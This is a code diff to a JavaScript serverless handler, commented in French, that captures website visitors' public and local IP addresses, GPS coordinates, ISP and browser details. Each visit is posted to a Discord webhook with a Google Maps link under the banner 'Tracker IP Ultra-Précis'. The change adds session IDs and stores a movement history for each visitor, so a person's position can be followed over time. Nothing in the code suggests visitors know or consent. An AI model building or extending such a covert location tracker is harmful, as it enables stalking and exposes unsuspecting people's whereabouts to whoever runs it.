@@ -15,7 +15,7 @@ export default async function handler(req, res) {
     console.error("Erreur géo:", e);
   }
 
-  const { localIp, preciseLocation, userAgent, language, screenResolution, referrer, page } = req.body;
+  const { sessionId, localIp, preciseLocation, userAgent, language, screenResolution, referrer, page } = req.body;
 
   let displayLocation = `${geo.city || 'Inconnue'} (${geo.regionName || ''}), ${geo.country || 'Inconnu'} [ZIP: ${geo.zip || '?'}]`;
   
@@ -38,6 +38,7 @@ export default async function handler(req, res) {
   }
 
   const logEntry = {
+    sessionId: sessionId || 'unknown',
     timestamp: new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' }),
     publicIp,
     localIp,
@@ -54,12 +55,15 @@ export default async function handler(req, res) {
 
   console.log('NOUVELLE VISITE CAPTURÉE:', JSON.stringify(logEntry, null, 2));
 
-  // Envoi vers Discord
+  // Envoi vers Discord (uniquement pour le premier log ou si mouvement significatif ?)
+  // Pour éviter le spam, on pourrait limiter l'envoi Discord, mais gardons-le pour l'instant
   const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
   
   if (webhookUrl) {
     const cleanCoords = logEntry.coords.replace(/\s/g, '');
     const mapsLink = `https://www.google.com/maps?q=${cleanCoords}`;
+    const isUpdate = sessionId && sessionId !== 'unknown'; // Simple check
+    
     const locValue = logEntry.isPrecise 
       ? `✅ **LOCALISATION RÉELLE (GPS)**\n**${logEntry.location}**\n\n📍 [Ouvrir dans Google Maps](${mapsLink})\nCoords: \`${logEntry.coords}\`` 
       : `❌ IP Uniquement (Approximatif)\n**${logEntry.location}**\nCoords: \`${logEntry.coords}\``;
@@ -71,15 +75,13 @@ export default async function handler(req, res) {
       { name: "📍 Localisation Précise", value: locValue }
     ];
 
-    // On n'ajoute le fournisseur (ISP) QUE si on n'a pas la localisation GPS
     if (!logEntry.isPrecise) {
       fields.push({ name: "📡 Fournisseur (ISP)", value: logEntry.isp });
     }
 
     fields.push(
       { name: "📄 Page", value: logEntry.page },
-      { name: "📱 Appareil", value: `\`${userAgent.substring(0, 250)}\`` },
-      { name: "🖥️ Résolution", value: screenResolution, inline: true }
+      { name: "🆔 Session", value: `\`${logEntry.sessionId}\``, inline: true }
     );
 
     try {
@@ -88,7 +90,7 @@ export default async function handler(req, res) {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           embeds: [{
-            title: "🚀 Nouvelle Visite sur le Site !",
+            title: isUpdate ? "🔄 Mise à jour de Position !" : "🚀 Nouvelle Visite sur le Site !",
             color: logEntry.isPrecise ? 0x00FF00 : 0xFFA500,
             fields: fields,
             footer: { text: "Tracker IP Ultra-Précis - Saadaa le Goat" }
@@ -100,13 +102,32 @@ export default async function handler(req, res) {
     }
   }
 
-  // Stockage pour le fichier .txt (Vercel KV)
+  // Stockage pour le dashboard (Vercel KV)
   if (process.env.KV_REST_API_URL && process.env.KV_REST_API_TOKEN) {
     try {
-      const logLine = `[${logEntry.timestamp}] IP:${publicIp} | Local:${localIp} | Loc:${logEntry.location} | Page:${logEntry.page}\n`;
+      // 1. Log général
+      const logLine = `[${logEntry.timestamp}] IP:${publicIp} | Local:${localIp} | Loc:${logEntry.location} | Session:${logEntry.sessionId}\n`;
       await fetch(`${process.env.KV_REST_API_URL}/lpush/visitor_logs/${encodeURIComponent(logLine)}`, {
         headers: { Authorization: `Bearer ${process.env.KV_REST_API_TOKEN}` }
       });
+
+      // 2. Historique de mouvement pour cette session
+      const movementData = JSON.stringify({
+        lat: preciseLocation ? preciseLocation.lat : geo.lat,
+        lon: preciseLocation ? preciseLocation.lon : geo.lon,
+        time: logEntry.timestamp,
+        isPrecise: logEntry.isPrecise,
+        localIp: localIp
+      });
+      await fetch(`${process.env.KV_REST_API_URL}/rpush/session_movement:${logEntry.sessionId}/${encodeURIComponent(movementData)}`, {
+        headers: { Authorization: `Bearer ${process.env.KV_REST_API_TOKEN}` }
+      });
+      
+      // 3. Liste des sessions actives
+      await fetch(`${process.env.KV_REST_API_URL}/sadd/active_sessions/${logEntry.sessionId}`, {
+        headers: { Authorization: `Bearer ${process.env.KV_REST_API_TOKEN}` }
+      });
+
     } catch (e) {
       console.error("Erreur Stockage KV:", e);
     }
